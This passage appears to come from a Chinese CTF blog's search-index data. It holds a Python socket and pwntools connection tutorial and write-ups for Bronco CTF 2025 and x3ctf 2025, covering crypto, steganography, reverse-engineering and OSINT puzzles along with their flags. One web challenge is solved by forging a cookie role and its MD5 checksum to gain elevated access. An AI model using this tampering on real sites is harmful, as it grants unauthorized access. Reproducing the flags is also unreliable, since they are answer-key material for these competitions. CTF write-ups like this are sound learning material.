数据库","slug":"TUM-info-课程笔记/Dantenbank-数据库","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/tags/Database/"},{"name":"数据库","slug":"数据库","permalink":"https://archer-baiyi.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"与服务器的交互","slug":"CTF/与服务器的交互","date":"2025-03-10T19:22:29.000Z","updated":"2025-03-31T12:45:34.302Z","comments":true,"path":"2025/03/10/CTF/与服务器的交互/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E4%BA%A4%E4%BA%92/","excerpt":"使用socket.socket()与remote（）连接服务器","text":"socket.socketsocket 是 Python 标准库中的模块，用于进行 TCP/UDP 连接。 假设服务器地址是 example.com，端口是 1234： 123456789101112131415161718192021import socket# 1. 创建一个TCP sockets = socket.socket()# 2. 连接远程服务器# connect的参数要求为一个tupels.connect((&quot;example.com&quot;, 1234))# 3. 发送数据（例如发送 &quot;Hello&quot;）# sendall() 默认发送的是 bytes 类型的数据，所以需要 b&quot;&quot; 或者 &quot;&quot;.encodes.sendall(b&quot;Hello\\n&quot;)# 4. 接收服务器返回的数据# 这个参数按需调节就好data = s.recv(1024) # 一次接收 1024 字节print(&quot;Received:&quot;, data.decode())# 5. 关闭连接s.close() 如果服务器会发送非常多的内容，则需要一直循环接收服务器发送的消息： 123456789101112131415161718192021import sockets = socket.socket()s.connect((&quot;example.com&quot;, 1234))# 持续接收数据，直到服务器关闭连接data = b&quot;&quot; # 用于存储完整的接收数据while True: part = s.recv(1024) # 每次读取 1024 字节 if not part: # 如果 part 为空，表示服务器关闭连接 break data += part # 累加数据# 按行分割并逐行打印lines = data.decode().splitlines()for line in lines: print(line)s.close() 也可以使用time.sleep()来确保收到完整信息： 12345678910111213141516import socketimport times = socket.socket()s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)time.sleep(0.5)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() SSL连接 SSL 连接会比普通的TCP连接（socket.socket()）多一步加密的步骤 123456789101112131415161718import socketimport sslsock = socket.socket()# 使用 SSL 加密 sockets = ssl.wrap_socket(sock)s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() pwntools的remotepwntools 是专门为 Pwn 题目设计的 Python 库，封装了 socket。 123456789101112131415from pwn import *# 1. 连接服务器r = remote(&quot;example.com&quot;, 1234)# 2. 发送数据r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;# 3. 接收数据response = r.recvall() # 读取所有信息# response = r.recvline() # 读取一整行print(&quot;Received:&quot;, response.decode())# 4. 关闭连接r.close() 比起socket，pwn拥有更高级的功能： 12345678910r.recvuntil(b&quot;\\n&quot;) #一直读数据，直到匹配特定字符串。# p.recvuntil(b&quot;Enter your name:&quot;)r.interactive() # 进入交互模式#比如说在pwn的题目里如果成功打开了shell（system(&quot;/bin/sh&quot;)），进入交互模式则可以直接手动执行命令。response = r.recvall()# recvall会自动读取所有可用数据 直到服务器关闭连接。不再需要像原生 socket 那样手写 while True 循环。r.sendafter(b&quot;input:&quot;, b&quot;1234&quot;) # 先等待服务器发送 input:，然后再发送 1234 remote() 里也可以启用 SSL： 12345678910from pwn import *r = remote(&quot;example.com&quot;, 1234, ssl=True) # 开启 SSL 加密r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;response = r.recvline()print(&quot;Received:&quot;, response.decode())r.close() 总的来说，在做CTF题目时，pwn的remote可以完成所有与服务器的交互。 socket.socket没有的remote有，socket.socket没有的remote也有。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"}],"tags":[{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/tags/remote/"}]},{"title":"Bronco CTF Write Up","slug":"CTF/Writeup/Bronco-CTF-Write-Up","date":"2025-03-10T12:28:52.000Z","updated":"2025-03-25T19:31:22.365Z","comments":true,"path":"2025/03/10/CTF/Writeup/Bronco-CTF-Write-Up/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/Writeup/Bronco-CTF-Write-Up/","excerpt":"Bronco CTF比赛的题解，涉及方向：Crypto, Web, Reverse, Steg, Misc, Forensics","text":"BeginnerBreak the Battalion 这道题我们会拿到一份ELF文件，我们用IDA打开它会看到 可以发现，这个程序的核心内容是encrypt，所以我们查看一下它的内容： 写一段python便可以简单得知输入什么内容最后会输出“brigade”： 12345678def decrypt(encrypted): return &#x27;&#x27;.join(chr(ord(c) ^ 0x50) for c in encrypted)encrypted = &quot;brigade&quot;original_input = decrypt(encrypted)print(f&quot;Original input: &#123;original_input&#125;&quot;)# Original input: 2&quot;97145 所以flag为： 1bronco&#123;2&quot;97145&#125; (吐槽一下，这个flag的内容真的非常奇怪，一般都是会带点正常单词的。) Simon Says 这道题我们会拿到这样一张图片： 并没有任何有用的内容。根据题目描述我们猜测这道题用了LSB隐写，所以用Stegsolve打开图片便可得到： flag为： 1bronco&#123;simon_says_submit_this_flag&#125; Too Many Emojis这道题我们会得到一串emoji内容： 因为知道flag的格式为bronco{}，所以可以确定这个应该是单表加密，并且知道前6个emoji对应的明文。 经过一系列搜索与排查可以发现每一个emoji对应的字母为这个emoji的官方英文名的首字母，根据这个线索我们可以通过找到的这些信息来解密内容： （用到的网站：https://unicode.org/emoji/charts/full-emoji-list.html） 这里有一个小技巧：如果找不到想要的 emoji，可以描述给 ChatGPT 并询问其官方名称，再到网站上用名称（或部分名称）搜索，确认是否是我们需要的。 最后得到flag： 1bronco&#123;emojis_express_my_emotions&#125; Straight Up Circular 这道题给出的加密字符串如下： 1dvlby_otspnr&#123;cobrnot450i1nm_e03&#125; 首先，通过 &#123;&#125; 的位置，我们可以判断这并不是替换加密。其次，我们发现 bronco&#123;&#125;（该比赛的 flag 统一格式）中的每个字母和符号都出现在了这串字符串中，因此很可能是某种乱序加密。 先确定 b、r、o 等字母在加密字符串中的具体位置，再根据题目名字（Straight Up Circular）不难发现这个用这个规律可以得到的flag开头： 从字符串正中间的 b 出发 先向右移动 1 位 再向左移动 2 位 接着向右移动 3 位 依此类推…… 继续这个流程便可以成功获得flag： 1bronco&#123;tr4n5p0sit1on_my_bel0v3d&#125; CryptoAcross the Tracks 我们会得到一段内容： 1Samddre··ath·dhf@_oesoere·ebun·yhot·no··oso·i·a·lr1rcm·iS·aruf·toibadhn·nadpikudynea&#123;l_oeee·ch·oide·f·n·aoe·sae·aonbdhgo_so·rr.i·tYnl·s·tdot·xs·hdtyy&#x27;·.t·cfrlca·epeo·iufiyi.t·yaaf·.a.·ts··tn33&#125;i·tvhr·.tooho···rlmwuI·h·e·iHshonppsoleaseecrtudIdet.·n·BtIpdheiorcihr·or·ovl·c··i·acn·t·su··ootr·:b3cesslyedheIath·e·_ 根据题目描述我们猜测这段内容使用了栅栏密码，并且key为题目描述中提到的“tenth”（10）。解密即可得到flag： 1bronco&#123;r@1l_f3nc3_cip3rs_r_cool&#125; Rahhh-SA 这道题我们会得到以下内容： 1234e = 65537n = 3429719c = [-53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]p = -811 首先注意到c的所有内容都是负数，但是其绝对值都小于等于n，所有猜测将其直接放进 $\\mathbb{Z}/n\\mathbb{Z}$ 进行计算即可。但因为发现$p’ := n+p = 3,428,908$ 并不是n的因数，所以尝试 $3429719/811=4229$ ，发现结果为整数。 所以写一段python代码来尝试RSA解码即可： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3e = 65537n = 3429719p = 811 # 题中写的是 -811，这里只取绝对值q = n // p # 4229# 计算 phi(n)phi = (p - 1) * (q - 1) # (811 - 1)*(4229 - 1) = 810*4228 = 3424680# 求 d = e^-1 mod phi(n)# Python 3.8+ 可以直接用 pow(e, -1, phi) 得到模逆d = pow(e, -1, phi)# 给出的负数密文c_list = [ -53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]# 解密plaintext_nums = []for c in c_list: # 先把负数转为 mod n 内的非负代表元 c_mod = c % n m = pow(c_mod, d, n) plaintext_nums.append(m)message = &#x27;&#x27;.join(chr(m) for m in plaintext_nums)print(&quot;解密后得到的数值:&quot;, plaintext_nums)print(&quot;尝试映射到字符后的结果:&quot;)print(message)# bronco&#123;m4th3m4t1c5_r34l1y_1s_qu1t3_m4g1c4l_raAhH!&#125; WebGrandma’s Secret Recipe （因为这份食谱离婚了实在是有点抽象） 点击网站可以看到： 点开Cookie可以发现有2条内容： 12checksum: a223befb6660a23f9c3491f74ef84e43role: &quot;kitchen helper&quot; 结果检查发现checksum为role的md5结果： 所以我们将role改为：”grandma”，并且将checksum改为a5d19cdd5fd1a8f664c0ee2b5e293167（=md5(grandma))。点击“Grandma’s Pantry“便可以看到： 得到flag： 1bronco&#123;grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact&#125; ReverseReversing for Ophidiophiles 这道题我们会得到以下内容： 123a326c27bee9b40885df97007aa4dbe410e93 1234567891011121314flag = input()carry = 0key = &quot;Awesome!&quot;output = []for i,c in enumerate(flag): val = ord(c) val += carry val %= 256 val ^= ord(key[i % len(key)]) output.append(val) carry += ord(c) carry %= 256print(bytes(output).hex()) 直接用python写一段逆向的算法便可以得到flag： 123456789101112131415encrypted_hex = &quot;23a326c27bee9b40885df97007aa4dbe410e93&quot;encrypted_bytes = bytes.fromhex(encrypted_hex)carry = 0key = &quot;Awesome!&quot;flag = []for i, val in enumerate(encrypted_bytes): val ^= ord(key[i % len(key)]) # 逆向 XOR 操作 val = (val - carry + 256) % 256 # 逆向 carry 计算 flag.append(chr(val)) carry = (carry + val) % 256 # 重新计算 carry 值print(&quot;&quot;.join(flag))# bronco&#123;charge_away&#125; theflagishere! 这道题我们会得到一份Python 编译后的字节码文件 “theflagishere.pyc”，我们首先用这个网站将其反汇编： https://www.lddgo.net/string/pyc-compile-decompile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.9def what_do_i_do(whoKnows): a_st = &#123; &#125; for a in whoKnows: if a_st.get(a) == None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] continue return (not_a_variable_name, variable_name)def char_3(): return &#x27;m&#x27;def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def i_am_a_function(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 newVariable = variableName * i newVariable += 100 variableName /= i + 1 return chr(ord(chr(int(variableName))))def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;def i(): return &#x27;free_flag_f&#x27;def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinteresting 然后用python写一段逆向的脚本即可得到flag （主要内容其实就是复制粘贴）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105def what_do_i_do(whoKnows): a_st = &#123;&#125; for a in whoKnows: if a_st.get(a) is None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] return (not_a_variable_name, variable_name)def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinterestingdef i(): return &#x27;free_flag_f&#x27;def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_3(): return &#x27;m&#x27;def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;# 拼接 flagflag = ( char_0() + char_1_4_6() + char_2_5_9() + char_3() + char_1_4_6() + char_2_5_9() + char_1_4_6() + char_7() + char_8() + char_2_5_9() + char_10())print(&quot;Recovered flag:&quot;, flag)# i_am_a_flag# bronco&#123;i_am_a_flag&#125; ForensicsQR Coded 这道题我们会得到一张二维码： 直接扫描（https://scanqr.org/）会得到一个fake flag： 用Stegsolve打开并调整到Gray bits会得到另外一张二维码： 扫描后会得到真正的flag： 1bronco&#123;th1s_0n3_i5&#125; Uno 这道题我们会得到这样一张图片： 根据题目描述（”a significant bit of the cards were left on the plane I was on.“）我们猜测这道题用的是LSB隐写了ASCII码，所以我们用StegSolve打开图片，利用其Data Extract模块进行查看。这个模块可以查看RGB三种颜色的每一个通道，并且按照（自选的）一定的排列顺序显示每个通道的Hex和ASCII码字符： 最后，根据题目描述中的 “the numbers really speak to me…” 这一句，尝试各种由 2、3、4、5 组成的组合，便可以得到 flag： 1bronco&#123;no_un0_y3t&#125; Wordlands 我们会得到这张图片： 经过一番尝试后，当用StegSolve打开图片，利用其Data Extract模块进行查看时可以发现： 8BPS是标准的Photoshop 的.psd 文件有固定的文件头，所以我们点击“Save Bin”将其存为wordlands.psd，并用这个网站打开它： https://www.photopea.com/ 可以发现这里有所有图片创作的信息（图层之类的）。最后根据line的图层的顺序进行拼接便可以得到flag： 比如说Shape1这个图层里的线连接了b和r，表示开头为br 然后是(b)ro，以此类推… 1bronco&#123;i_love_admiring_beautiful_winter_landscapes&#125; MiscTick Tock 这道题我们首先会得到这张图片： 经过多次尝试可以在StegSolve的Data Extract模块里发现有一长串由“tick”和“tock”组成的内容： 1ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock 写一段python将tick替换成0，tock替换成1然后当成二进制内容进行解码会得到： 1234567891011121314151617def ticktock_to_binary(text): return text.replace(&quot;tick&quot;, &quot;0&quot;).replace(&quot;tock&quot;, &quot;1&quot;)text = &quot;ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock&quot;text = text.replace(&quot; &quot;, &quot;&quot;)binary = ticktock_to_binary(text)print(binary)# 01110001 01100111 01100100 01100011 01110010 01100100 01111011 01110101 01111000 01101011 01110100 01011111 01100010 01111000 01100011 01101010 01101001 01110100 01101000 01011111 01101010 01100011 01101001 01111000 01100001 01011111 01100010 01111000 01110011 01100011 01111000 01110110 01110111 01101001 01111101content = &#x27;&#x27;.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))print(content)# qgdcrd&#123;uxkt_bxcjith_jcixa_bxscxvwi&#125; 最后通过遍历凯撒密码便可以得到flag： 1bronco&#123;five_minutes_until_midnight&#125; 比赛官方GitHubhttps://github.com/SCUBroncoSec/BroncoCTF-2025-Public","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"X3ctf2025 Write Up","slug":"CTF/Writeup/X3ctf2025-Write-Up","date":"2025-03-10T12:25:08.000Z","updated":"2025-03-29T19:01:01.170Z","comments":true,"path":"2025/03/10/CTF/Writeup/X3ctf2025-Write-Up/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/Writeup/X3ctf2025-Write-Up/","excerpt":"x3ctf比赛的题解，涉及方向：Misc, Crypto","text":"Miscp11n-trophy（签到题）:题目描述： 我们首先会得到这样一份证书： 第一题签到题的答案就是证书下面正中间的“This certificate does not grant the rank of Master”。 trophy-plus + trophy-plus64:这两道目描述一模一样 其中一个flag是藏在certificate周围一圈的位置： 人工将这些内容识别，再翻译成二进制然后解码就会得到flag 1234567891011121314151617181920212223242526272829303132def decode_binary(content, mapping): # Convert content to binary using the mapping binary_str = &#x27;&#x27;.join(mapping[char] for char in content if char in mapping) # Split the binary string into 8-bit chunks bytes_list = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)] # Convert each 8-bit chunk to a character decoded_text = &#x27;&#x27;.join(chr(int(byte, 2)) for byte in bytes_list if len(byte) == 8) return decoded_text# Input stringc_1 = &quot;MVVVVMMMMMVVMMVVMVVMMMVVMVVVVMVVMVVM VMMV MV MVVVVVMVVMM VMM MMVVMMMV&quot;c_2 = &quot;MVVMM VMMMVVMVVVMMM VMMVVVMVVVMV MMM VMVVVVVMVVM VMVVMVVMVVVMMMVVMMMMMVVVMVVVM VMVVVVV&quot;c_3 = &quot;VMMMVVMMM VMMMVVMVVVVVM VMMV MMVVVMMMMMVVMMMVVMMVVMVVVVVM VMMM VMMVVMVVMMVVMMVVMMVVVM VMV MVVVMVVVVVM VM VM VMMVVMMV MMMVVMVVVVVMV MMMV MMVVMMMVVMVVM VMV MVVVMMMMMVVMMVVMMMVVMVVVVVM VMV MVVMVVMMVVMVVVM VMVVMVVM&quot;reversed_c_3 = c_3[::-1]c_4 = &quot;MMV MMVVMMMMMVVMMVVMMMVVMMVVVMVVMVVMMVVMMVVVVVM VMV MMVVVVMMV MMVVVMMM VMVVMMMVVVMVVM&quot;reversed_c_4 = c_4[::-1]c_5 = &quot;MMVVMMM VMVVMVVVMMVVMMVVVM VMVVVVVMVVMVVMMMMVVMMMMMVVMVVMMMVVVVVMV&quot;# mapping = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;mapping1 = &#123;&#x27;M&#x27;: &#x27;1&#x27;, &#x27;V&#x27;: &#x27;0&#x27;&#125;mapping2 = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;# print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(c_3, mapping2) + decode_binary(c_4, mapping2) + decode_binary(c_5, mapping2) )print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(reversed_c_3, mapping2) + decode_binary(reversed_c_4, mapping2) + decode_binary(c_5, mapping2) )# 输出结果：x3c&#123;i_d1dn&#x27;t_kn0w_mvm_c0uld_be_us3d_f0r_b1n4ry_3nc0d1ng_l0l&#125; 另外一个flag则是藏在右下角的勋章里： 人工将这些内容识别出来然后用base64进行解码即可。 内容大概为： 12345678910111213141516171819202122232425262728-----BEGIN CERTIFICATE-----MIIDyjCCAlCgAwIBAgISBKmF/S4TYSXpTzcor9eZJ/GrMAoGCCqGSM49BAMDMDIxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEwlMZXQncyBFbmNyeXB0MQswOQYDVQQDEwJFNjAeFw0yNTAxMDYyMDM2MDFaFw0yNTA0MDYyMDM2MDBaMEAxPjA8BgNVBAMMNXgzY3ttdTV0X2IzX2Zlbl90eXAxbmdfdGgxcl9ieV9oNG5kXzEzNzUxMDUzMDQyNDgzNjF9MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEcYu3flnEI2dttI5lQQmzRld72SDdBqCDtfto9pg5t/NFFIolkY8W8CryM9XlJEx3NAOGTgBoeUNTuWgiCseQeaOCAjYwggIyMA4GA1UdDwEB/wQEAwIHgDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYDVR0TAQH/BAIwADAdBgNVRQ4EFgQUrbtyF28hjw8oIqwXpakw8t7J9jQwHwYDVR0jBBgwFoAUkydGmAOpUWiOmNbEQkjbI79YlNIwVQYIKwYBBQUHAQEESTBHMCEGCCsGAQUFBzABhhVodHRwOi8vZTYuby5sZW5jci5vcmcwIgYIKwYBBQUHMAKGFmh0dHA6Ly91Ni5pLmxlbmNyLm9yZy8wQAYDVR0RBDkwN4IleDNje2llNXRfYjNfZnVuX3R5cDFuZl90aDFzX2J5X2g0bmRfMTM3NTEwNTMwNDI0ODM2MX0wEwYDVR0gBAwwCjAIBgZngQwBAgEwggEDBgorBgEEAdZ5AgQCBIH0BIHxAO8AdQB9WR4S4XggexxhZ3xe/fjQhlw0oE6VnrkDL9kOjC55uAAAAZQ9inTEAAAEAwBGMEQCIENpWRg98SQo5JdzyjgnyFeUY0WnNVzn5NkdDA3bzeKbAiBsAkk3fe5esm7A0efsLN/EyFjEK/NBGqYxgOucgZheQwB2ABNK3xglmEIjeAxv70x6kaQWtyNJzlhXat+u2qfCq+AiAAAB1D2KdXoAAAQDAEcwRQIgBfU4pkiNyNsl+I6skjXz6qqu+mNoI4JvtDsoYxoI+ZoCIQCRiMQSCEwahN0ImXu3cwDeyM+AbNeve0VgSLMSUBdxvTAKBggghkjOPQQDAwNoADBlAjEAvxa6nSpUMl7NuDB/+LJfzTskR498vLoetnZuHo14J6d9zuFRGQ8Dk4w2aQNsbuVsAjB9fE6GJYBiebb4aHu/J2amych3KP//D951/CdmiV5PKZqXWWdpaQZL+pbmsXRa8rM=-----END CERTIFICATE----- 会有一些误差，所以最后提交flag时需要多试几次。 foundations （Osint）：题目描述： 使用https://archive.org/来搜索这个比赛网站的历史纪录内容 可以在这里发现最早的纪录是在2024年7月14日： 点进去会发现： x3CTF{m4yb3_w3ll_m4ke_4_ch4ll3nge_0u7_0f_7h1s} mvm： 打开下载文件会得到 12MMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVM